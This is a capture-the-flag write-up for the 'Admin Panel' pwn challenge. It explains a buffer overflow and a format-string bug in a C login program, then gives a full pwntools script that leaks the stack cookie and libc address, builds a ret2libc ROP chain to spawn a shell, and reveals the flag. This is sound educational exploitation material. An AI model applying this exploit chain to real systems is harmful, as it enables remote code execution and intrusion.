https://ctftime.org/event/2238/

# Admin Panel ~ PWN

I made a secure login panel for administrators to access.I might not be the best C programmer out there, but just in case, I decided to enable several standard security measures to prevent unauthorized access.

NOTE: Successful exploit attempts may take several tries, due to security measures.

## Solution

We can see on line 65 that there is a buffer overflow:

```
scanf("%44s", password);
```

We can see on line 69 that `printf` is passed a string directly. Nice.

`status` lives on the stack and can be written to by the buffer overflow we saw earlier.

We can see that on line 67 only the first 13 bytes of the password buffer need to match:

```
if (strncmp(username, "admin", 5) != 0 || strncmp(password, "secretpass123", 13) != 0) {
```

The rest of the password buffer can be used as either padding, to reach the status buffer, or for our `printf` payload.

We can determine the exact amount of padding easily with the `cyclic` function in pwntools.

Once we know the amount of padding required, such that the first byte of the status buffer is written to next, we can supply a `%p` based `printf` payload to leak the stack cookie and return address with the following:

```
"secretpass123aaaabaaacaaadaaaeaa%15$p.%17$p"
```

The return address is within libc, specifically at `0x2409b` in `__libc_start_main`, so we can use this to compute the base address of libc.

In order to get the flag we must use another buffer overflow present in `admin` on line 39:

```
scanf("%128s", report);
```

Grab a couple of useful gadgets:

```
$ ROPgadget --binary ./libc.so.6 | grep ": pop rdi ; ret$"
0x0000000000023a5f : pop rdi ; ret
```

```
$ ROPgadget --binary ./libc.so.6 | grep ": ret$"
0x000000000002235f : ret
```

Now we simply supply a `ret2libc` payload supplying our cookie and using the known base of libc:

```
from pwn import *

io = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")

io.readuntil(b"Enter username of length 16:\n")

payload = b"admin"

io.sendline(payload)

io.readuntil(b"Enter password of length 24:\n")

payload = b"secretpass123"
payload += b"aaaabaaacaaadaaaeaa" # padding
payload += b"%15$p.%17$p" # stack cookie and libc

io.sendline(payload)

io.readline()

leaks = io.readline().decode().split(".")

cookie = int(leaks[0], 16)

leak = int(leaks[1], 16)

libc = ELF("./libc.so.6")
libc.address = leak - 0x2409b

io.readuntil(b"Enter either 1, 2 or 3: \n")

io.sendline(b"2") # report

io.readuntil(b"Enter information on what went wrong:\n")

payload = b"A" * 0x48
payload += p64(cookie)
payload += p64(0)
payload += p64(libc.address + 0x23a5f) # pop rdi; ret
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.address + 0x2235f) # aligning ret
payload += p64(libc.sym["system"])
payload += p64(0)

io.sendline(payload)

io.clean()

io.sendline(b"cat flag.txt")

io.interactive() # works about 50% of the time
```

Don't forget the extra aligning `ret` in order to keep the stack aligned correctly.

## Flag
gigem{l3ak1ng_4ddre55e5_t0_byp4ss_s3cur1t1e5!!}
